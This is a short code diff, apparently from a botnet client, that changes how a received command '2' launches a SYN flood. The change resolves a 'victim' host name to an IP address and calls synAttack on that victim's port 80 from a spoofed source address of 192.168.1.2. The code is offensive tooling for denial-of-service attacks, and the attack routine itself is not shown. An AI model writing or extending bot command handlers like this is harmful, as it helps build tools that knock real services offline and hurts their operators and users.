@@ -15,6 +15,7 @@
 #include <errno.h>
 #include <time.h>
 #include <fstream>
+#include <netdb.h>
 #include "BotProtocol.h"
 using namespace std;
 
@@ -98,8 +99,13 @@ void parseCommand(char command[])
     }
     else if (command[0] == '2')
     {
+        struct hostent *hostinfo = NULL; //Host name
+        char victim_ip[256];
         cout << "SYN attacking..." << endl;
-        synAttack(victim, 22000, victim, 80, 3);
+        hostinfo = gethostbyname(victim);
+        sprintf(victim_ip,"%s",inet_ntoa(*(struct in_addr *)*(hostinfo->h_addr_list)));
+        cout << victim_ip << endl;
+        synAttack("192.168.1.2", 22000, victim_ip, 80, 3);
         cout << "Done" << endl;
     }
     else
